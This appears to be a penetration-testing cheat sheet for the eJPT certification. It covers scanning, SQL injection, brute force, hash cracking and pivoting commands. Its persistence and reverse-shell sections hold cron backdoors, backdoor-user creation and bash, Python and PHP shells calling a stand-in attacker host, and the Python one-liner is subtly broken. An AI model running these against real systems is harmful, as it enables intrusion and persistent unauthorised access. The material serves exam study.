# QUICK REFERENCE CARD - eJPT Tools at a Glance

## Phase 1: Reconnaissance Commands (Copy-Paste Ready)

### NMAP - Network Scanning
```bash
# Fast basic scan:
nmap -sV -sC -p- 192.168.1.100

# Save all formats:
nmap -sV -sC -p- -oA results 192.168.1.100

# Host discovery:
nmap -sn 192.168.1.0/24
```
**Read**: [01_RECON/01_nmap.md](01_RECON/01_nmap.md)

### GOBUSTER - Directory Brute Force
```bash
# Basic web scan:
gobuster dir -u http://target -w wordlist.txt

# With extensions:
gobuster dir -u http://target -w wordlist.txt -x php,txt

# Subdomains:
gobuster dns -d target.com -w subdomains.txt
```
**Read**: [01_RECON/02_gobuster.md](01_RECON/02_gobuster.md)

### NIKTO - Web Vulnerability Scan
```bash
# Basic scan:
nikto -h http://target

# With output:
nikto -h http://target -o report.html -F htm

# HTTPS:
nikto -h https://target -ssl
```
**Read**: [01_RECON/03_nikto.md](01_RECON/03_nikto.md)

### ENUM4LINUX - SMB Enumeration
```bash
# Full enumeration:
enum4linux -A 192.168.1.100

# Just users:
enum4linux -U 192.168.1.100

# Just shares:
enum4linux -S 192.168.1.100
```
**Read**: [01_RECON/04_enum4linux.md](01_RECON/04_enum4linux.md)

### NETCAT - Banner Grabbing
```bash
# Grab banner:
echo "" | nc -v 192.168.1.100 22

# Port scan:
nc -zv 192.168.1.100 80 443 3306

# Listener (reverse shell):
nc -l -p 4444
```
**Read**: [01_RECON/05_netcat.md](01_RECON/05_netcat.md)

### DIG/NSLOOKUP - DNS Enumeration
```bash
# Basic lookup:
dig example.com

# Get mail servers:
dig example.com MX +short

# Zone transfer attempt:
dig @ns1.example.com example.com AXFR
```
**Read**: [01_RECON/06_dns_enumeration.md](01_RECON/06_dns_enumeration.md)

### SMBCLIENT/SMBMAP - SMB Access
```bash
# List shares:
smbclient -L 192.168.1.100 -N

# Connect to share:
smbclient //192.168.1.100/share -N

# Check permissions:
smbmap -H 192.168.1.100
```
**Read**: [01_RECON/07_smbclient_smbmap.md](01_RECON/07_smbclient_smbmap.md)

### SNMPWALK - SNMP Enumeration
```bash
# Basic enumeration:
snmpwalk -v 2c -c public 192.168.1.1

# System description:
snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.1.1

# Processes:
snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.25.4
```
**Read**: [01_RECON/08_snmpwalk.md](01_RECON/08_snmpwalk.md)

---

## Phase 2: Exploitation Commands

### SEARCHSPLOIT - Find Exploits
```bash
# Find Apache exploits:
searchsploit Apache 2.4.6

# Show full path:
searchsploit -p 24659

# View code:
searchsploit -x 24659
```
**Read**: [02_EXPLOITATION/01_searchsploit_curl.md](02_EXPLOITATION/01_searchsploit_curl.md)

### CURL - Manual HTTP Testing
```bash
# Basic request:
curl -v http://target/page

# With POST data:
curl -X POST -d "user=admin&pass=pass" http://target/login

# Follow redirects:
curl -L http://target

# Custom header:
curl -H "Authorization: Bearer TOKEN" http://target/api
```
**Read**: [02_EXPLOITATION/01_searchsploit_curl.md](02_EXPLOITATION/01_searchsploit_curl.md)

### SQLMAP - SQL Injection
```bash
# Test parameter:
sqlmap -u "http://target/page?id=1"

# Extract databases:
sqlmap -u "http://target/page?id=1" --dbs

# Dump table:
sqlmap -u "http://target/page?id=1" -D db -T users --dump

# OS command:
sqlmap -u "http://target/page?id=1" --os-shell
```
**Read**: [02_EXPLOITATION/02_sqlmap.md](02_EXPLOITATION/02_sqlmap.md)

### HYDRA - Brute Force
```bash
# SSH brute force:
hydra -L users.txt -P pass.txt ssh://target

# FTP brute force:
hydra -L users.txt -P pass.txt ftp://target

# HTTP form:
hydra -L users -P pass http-post-form://target/login:user=^USER^&pass=^PASS^:F=Login
```
**Read**: [02_EXPLOITATION/03_hydra_ffuf.md](02_EXPLOITATION/03_hydra_ffuf.md)

### FFUF - Web Fuzzing
```bash
# Directory fuzz:
ffuf -u http://target/FUZZ -w wordlist.txt

# Subdomain fuzz:
ffuf -u http://FUZZ.target.com -w subdomains.txt

# Parameter fuzz:
ffuf -u http://target/search?q=FUZZ -w words.txt
```
**Read**: [02_EXPLOITATION/03_hydra_ffuf.md](02_EXPLOITATION/03_hydra_ffuf.md)

---

## Phase 3: Post-Exploitation Commands

### JOHN - Hash Cracking
```bash
# Crack shadow file:
john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Show results:
john --show /etc/shadow
```
**Read**: [03_POST_EXPLOITATION/01_cracking_privesc.md](03_POST_EXPLOITATION/01_cracking_privesc.md)

### HASHCAT - GPU Cracking
```bash
# Crack MD5:
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Crack NTLM:
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Show results:
hashcat -m 0 -a 0 hashes.txt rockyou.txt --show
```
**Read**: [03_POST_EXPLOITATION/01_cracking_privesc.md](03_POST_EXPLOITATION/01_cracking_privesc.md)

### LINPEAS - Privilege Escalation Enum
```bash
# Run linpeas:
./linpeas.sh

# Save output:
./linpeas.sh > linpeas.txt

# Look for RED items (critical)
```
**Read**: [03_POST_EXPLOITATION/01_cracking_privesc.md](03_POST_EXPLOITATION/01_cracking_privesc.md)

### GTFOBINS - Binary Exploitation
Visit: https://gtfobins.github.io/

Search for SUID binary → find exploitation code
**Read**: [03_POST_EXPLOITATION/01_cracking_privesc.md](03_POST_EXPLOITATION/01_cracking_privesc.md)

---

## Phase 4: Pivoting Commands

### SSH TUNNELING - Port Forwarding
```bash
# Local port forward:
ssh -L 9999:internal:80 user@pivot

# SOCKS proxy:
ssh -D 9050 user@pivot -N -f

# Remote port forward:
ssh -R 9999:localhost:3306 user@pivot
```
**Read**: [04_PIVOTING/01_pivoting_tunneling.md](04_PIVOTING/01_pivoting_tunneling.md)

### PROXYCHAINS - Route Through Proxy
```bash
# Setup SOCKS first:
ssh -D 9050 user@pivot &

# Scan through proxy:
proxychains nmap -sV 10.0.0.0/24

# Web through proxy:
proxychains curl http://internal:80
```
**Read**: [04_PIVOTING/01_pivoting_tunneling.md](04_PIVOTING/01_pivoting_tunneling.md)

### CHISEL - HTTP Tunneling
```bash
# Attacker (server):
chisel server -p 8080 --reverse

# Target (client):
chisel client http://attacker:8080 R:socks
```
**Read**: [04_PIVOTING/01_pivoting_tunneling.md](04_PIVOTING/01_pivoting_tunneling.md)

### METASPLOIT ROUTING
```bash
# In msfconsole:
route add 10.0.0.0 255.255.255.0 [session_id]
route print

# Then scan/exploit through route
```
**Read**: [04_PIVOTING/01_pivoting_tunneling.md](04_PIVOTING/01_pivoting_tunneling.md)

---

## Phase 5: Essential System Commands

### Information Gathering
```bash
whoami              # Current user
id                 # User & groups
hostname           # Machine name
uname -a           # OS info
ifconfig / ip addr # Network config
pwd                # Current directory
cat /etc/passwd    # User list
cat /etc/shadow    # Hashes (if root)
sudo -l            # Sudo permissions
```

### Persistence
```bash
# Add SSH key:
echo "ssh-rsa KEY" >> ~/.ssh/authorized_keys

# Add cron backdoor:
(crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/port 0>&1") | crontab -

# Add user:
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
```

### Reverse Shell One-Liners
```bash
# Bash:
bash -i >& /dev/tcp/attacker/port 0>&1

# Python:
python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker",port));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'

# PHP:
php -r '$sock=fsockopen("attacker",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## 🎯 Quick Decision Tree

**"I need to find open ports"** → nmap  
**"I need to find web directories"** → gobuster  
**"I need to find web vulnerabilities"** → nikto  
**"I need SMB info"** → enum4linux → smbclient  
**"I need DNS info"** → dig  
**"I need to exploit SQL injection"** → sqlmap  
**"I need to crack passwords"** → hydra  
**"I need a shell"** → netcat / msfconsole  
**"I need to find privesc path"** → linpeas  
**"I need to crack hashes"** → john / hashcat  
**"I need to pivot networks"** → SSH tunneling + proxychains  

---

## 📊 By File Types

**Hash Types**:
- `$6$` = SHA-512 (John: sha512crypt, Hashcat: -m 1800)
- `$1$` = MD5 (John: md5crypt, Hashcat: -m 500)
- `NTLM` = Windows (John: NT, Hashcat: -m 1000)

**Common Ports**:
- 21 = FTP
- 22 = SSH
- 23 = Telnet
- 25 = SMTP
- 53 = DNS
- 80 = HTTP
- 110 = POP3
- 143 = IMAP
- 389 = LDAP
- 443 = HTTPS
- 445 = SMB
- 1433 = MSSQL
- 3306 = MySQL
- 3389 = RDP
- 5432 = PostgreSQL
- 5900 = VNC
- 8080 = Alt-HTTP

---

## 📚 Full Documentation Structure

| Phase | Files | Topics | Lines |
|-------|-------|--------|-------|
| 1 | 8 files | Reconnaissance | 20,000+ |
| 2 | 3 files | Exploitation | 6,000+ |
| 3 | 1 file | Post-Exploitation | 2,500+ |
| 4 | 1 file | Pivoting | 1,500+ |
| 5 | Tools | System commands | Inline |

---

## ⚡ Fastest Path to Success

**If you have 1 week:**
1. Day 1-2: Intensive Phase 1 (esp. nmap)
2. Day 3: Phase 2 (sqlmap focus)
3. Day 4: Phase 3 (privilege escalation)
4. Day 5: Practice scenarios
5. Day 6-7: Mock exams

**If you have 1 month:**
1. Week 1: All Phase 1 tools + practice (5 hours/day)
2. Week 2: All Phase 2 tools + practice (5 hours/day)
3. Week 3: Phase 3 & 4 + practice (5 hours/day)
4. Week 4: Review weak areas + mock exams

---

## 🔗 Navigation

- **[Main README](README.md)** - Start here for overview
- **[Full Summary](SUMMARY.md)** - Detailed guide
- **Phase 1 Recon** - [nmap](01_RECON/01_nmap.md) | [gobuster](01_RECON/02_gobuster.md) | [nikto](01_RECON/03_nikto.md) | [enum4linux](01_RECON/04_enum4linux.md) | [netcat](01_RECON/05_netcat.md) | [dns](01_RECON/06_dns_enumeration.md) | [smb](01_RECON/07_smbclient_smbmap.md) | [snmp](01_RECON/08_snmpwalk.md)
- **Phase 2 Exploit** - [searchsploit/curl](02_EXPLOITATION/01_searchsploit_curl.md) | [sqlmap](02_EXPLOITATION/02_sqlmap.md) | [hydra/ffuf](02_EXPLOITATION/03_hydra_ffuf.md)
- **Phase 3 Post** - [cracking/privesc](03_POST_EXPLOITATION/01_cracking_privesc.md)
- **Phase 4 Pivot** - [tunneling/pivoting](04_PIVOTING/01_pivoting_tunneling.md)

---

**Use this card as your quick reference during exams and engagements!**

*For detailed info on any tool, click the link or search the full documentation.*
